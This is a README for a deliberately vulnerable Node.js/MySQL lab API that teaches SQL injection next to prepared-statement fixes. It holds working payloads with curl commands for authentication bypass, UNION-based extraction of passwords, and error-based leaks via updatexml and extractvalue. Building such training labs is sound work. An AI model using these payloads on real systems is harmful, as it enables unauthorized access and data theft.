# SQL Injection Demo Backend

Educational Node.js API that **intentionally** demonstrates SQL Injection (SQLi) vulnerabilities alongside secure mitigations. Use only in isolated lab environments with explicit authorization.

## Project Overview

This backend exposes paired endpoints:

| Type | Purpose |
|------|---------|
| **Vulnerable** | Concatenates user input into SQL strings — enables auth bypass, UNION extraction, and error-based leakage |
| **Secure** | Uses `mysql2` prepared statements (`db.execute()`) — blocks classic injection |

Demonstrations covered:

- **Authentication bypass** via string concatenation in login
- **UNION-based data extraction** via the user search endpoint
- **Error-based information disclosure** (raw MySQL errors + executed query returned to client)
- **Mitigation** with parameterized queries on secure endpoints

## Tech Stack

- Node.js
- Express.js
- MySQL
- mysql2 (promise API)
- dotenv
- cors

## Project Structure

```text
sqli-demo-backend/
├── package.json
├── .env.example
├── Dockerfile
├── docker-compose.yml
├── docker-entrypoint.sh
├── README.md
├── server.js
├── db.js
├── routes/
│   ├── auth.js
│   └── users.js
└── sql/
    └── init.sql
```

## Docker Setup (recommended)

Runs the official **MySQL 8.0** image and the Node API as two linked containers on a shared Docker network. The database is seeded automatically from `sql/init.sql` on first start.

### Prerequisites

- [Docker](https://docs.docker.com/get-docker/) and Docker Compose v2

### Quick start

```bash
cd sqli-demo-backend

cp .env.example .env

docker compose pull mysql
docker compose up --build
```

Or use npm scripts:

```bash
npm run docker:up      # build and start
npm run docker:down    # stop containers
npm run docker:reset   # remove volumes and re-seed database
```

- API: `http://localhost:3000`
- MySQL (from host): `localhost:3307` — user `root`, password `sqli_root_pass` (see `MYSQL_PORT` / `MYSQL_ROOT_PASSWORD` in `.env`)

> **Note:** Port `3307` is used by default because many systems already run MySQL on `3306`. Change `MYSQL_PORT` in `.env` if needed.

Inside Docker, the API connects to MySQL using hostname `mysql` on the `sqli-net` network. You do not need a local MySQL install when using Compose.

### Troubleshooting Docker

| Symptom | Fix |
|---------|-----|
| API stuck on "Waiting for MySQL" | Run `docker compose down && docker compose up --build`. Ensure `sqli-mysql` is on `sqli-net`: `docker network inspect sqli-demo-backend_sqli-net` |
| Port 3306 already in use | Use `MYSQL_PORT=3307` (default in `.env.example`) |
| Empty `DB_PASSWORD` in `.env` | Set `MYSQL_ROOT_PASSWORD=sqli_root_pass` and `DB_PASSWORD=sqli_root_pass` |
| Stale database | `npm run docker:reset` |

### How it works

| Service | Image | Role |
|---------|-------|------|
| `mysql` | `mysql:8.0` | Database; `init.sql` mounted to `/docker-entrypoint-initdb.d/` |
| `api` | Built from `Dockerfile` | Express API; waits for MySQL healthcheck before starting |

## Local Setup (without Docker)

### 1. Install dependencies

```bash
cd sqli-demo-backend
npm install
```

### 2. Initialize the database

Ensure MySQL is running, then execute the init script:

```bash
mysql -u root -p < sql/init.sql
```

Or from the MySQL client:

```sql
source /path/to/sqli-demo-backend/sql/init.sql;
```

This creates the `sqli_demo` database, the `users` table, and sample rows.

### 3. Configure environment variables

```bash
cp .env.example .env
```

Edit `.env` with your MySQL credentials. If using Docker for the database only:

```env
PORT=3000
DB_HOST=localhost
DB_USER=root
DB_PASSWORD=sqli_root_pass
DB_NAME=sqli_demo
# When connecting to Docker MySQL from the host, use port 3307:
# mysql -h 127.0.0.1 -P 3307 -u root -psqli_root_pass sqli_demo
```

### 4. Start the server

```bash
npm run dev
```

Production-style start:

```bash
npm start
```

API base URL: `http://localhost:3000`

## API Documentation

### `GET /`

Returns API metadata and endpoint list.

### `POST /api/auth/login` (VULNERABLE)

Login with concatenated SQL. Returns raw errors on failure for error-based SQLi demos.

**Request body:**

```json
{
  "username": "admin",
  "password": "admin123"
}
```

**Success (200):**

```json
{
  "success": true,
  "message": "Login successful",
  "user": {
    "id": 1,
    "username": "admin",
    "role": "admin",
    "email": "admin@test.com"
  }
}
```

**Invalid credentials (401):**

```json
{
  "success": false,
  "message": "Invalid credentials"
}
```

**SQL error (500) — intentional for demos:**

```json
{
  "success": false,
  "message": "Database error",
  "error": "<MySQL error message>",
  "query": "<executed SQL>"
}
```

### `POST /api/auth/secure-login` (SECURE)

Same contract as login, but uses prepared statements. SQL errors are not exposed to the client.

### `GET /api/users`

Lists all users (includes passwords — lab use only).

**Response:**

```json
{
  "success": true,
  "users": [...]
}
```

### `GET /api/users/search?username=` (VULNERABLE)

Search by username with `LIKE '%...%'`. Supports UNION-based and error-based injection. Returns the executed query on success and on error.

**Example:** `GET /api/users/search?username=admin`

**Success:**

```json
{
  "success": true,
  "query": "...",
  "count": 1,
  "results": [...]
}
```

**SQL error (500):**

```json
{
  "success": false,
  "message": "Database error",
  "error": "<MySQL error message>",
  "query": "<executed SQL>"
}
```

### `GET /api/users/secure-search?username=` (SECURE)

Parameterized `LIKE` search. Injection payloads are treated as literal strings.

## SQL Injection Payload Examples

### 1. Authentication Bypass

**Endpoint:** `POST /api/auth/login`

```json
{
  "username": "' OR '1'='1' -- ",
  "password": "anything"
}
```

```bash
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"'\'' OR '\''1'\''='\''1'\'' -- ","password":"anything"}'
```

The trailing `-- ` comments out the password check.

### 2. UNION-Based SQL Injection

**Endpoint:** `GET /api/users/search`

URL-encoded parameter:

```text
' UNION SELECT id, username, password, role, email, salary FROM users -- 
```

```bash
curl -G "http://localhost:3000/api/users/search" \
  --data-urlencode "username=' UNION SELECT id, username, password, role, email, salary FROM users -- "
```

### 3. Column Count Discovery (ORDER BY)

Increment the column index until MySQL errors (6 columns in the SELECT):

```text
' ORDER BY 1 -- 
' ORDER BY 2 -- 
' ORDER BY 3 -- 
' ORDER BY 6 -- 
' ORDER BY 7 --   ← should fail
```

```bash
curl -G "http://localhost:3000/api/users/search" \
  --data-urlencode "username=' ORDER BY 7 -- "
```

### 4. Error-Based SQL Injection

**Database name via `updatexml`:**

```text
' AND updatexml(1, concat(0x7e, database(), 0x7e), 1) -- 
```

```bash
curl -G "http://localhost:3000/api/users/search" \
  --data-urlencode "username=' AND updatexml(1, concat(0x7e, database(), 0x7e), 1) -- "
```

**MySQL user via `extractvalue`:**

```text
' AND extractvalue(1, concat(0x7e, user(), 0x7e)) -- 
```

```bash
curl -G "http://localhost:3000/api/users/search" \
  --data-urlencode "username=' AND extractvalue(1, concat(0x7e, user(), 0x7e)) -- "
```

Login endpoint error-based example (malformed SQL):

```json
{
  "username": "admin'",
  "password": "test"
}
```

## How to Test Error-Based SQL Injection

1. Start the API and confirm MySQL is connected.
2. Call a **vulnerable** endpoint with a payload that triggers a MySQL error (e.g. `updatexml` / `extractvalue` on search, or a syntax-breaking quote on login).
3. Inspect the JSON response: `error` contains the MySQL message (often including leaked data such as `database()` or `user()`).
4. Compare with **secure** endpoints — errors are generic and no `query` field is returned.

## How to Test UNION-Based SQL Injection

1. Use `GET /api/users/search` with `ORDER BY n` to find column count (6).
2. Craft `UNION SELECT` with six columns matching types/order: `id, username, password, role, email, salary`.
3. Confirm `results` includes injected rows and `query` shows the full concatenated SQL.
4. Try the same payload on `GET /api/users/secure-search` — it should not execute injected SQL.

## Secure Endpoints Explained

| Endpoint | Mitigation |
|----------|------------|
| `POST /api/auth/secure-login` | `db.execute(query, [username, password])` — placeholders `?` |
| `GET /api/users/secure-search` | `db.execute(query, ['%' + username + '%'])` — bound `LIKE` value |

Prepared statements separate SQL structure from data. User input cannot break out of string literals or add new clauses.

**Never** deploy vulnerable patterns to production. Always use parameterized queries or an ORM with bound parameters.

## Educational Use Disclaimer

This software is provided **solely for authorized security education and training** in controlled environments. The vulnerable endpoints are deliberate and dangerous.

- Do **not** expose this API to the public internet.
- Do **not** use against systems you do not own or lack written permission to test.
- Unauthorized access to computer systems may violate applicable laws.

The authors assume no liability for misuse. Use responsibly and only where you have explicit permission.
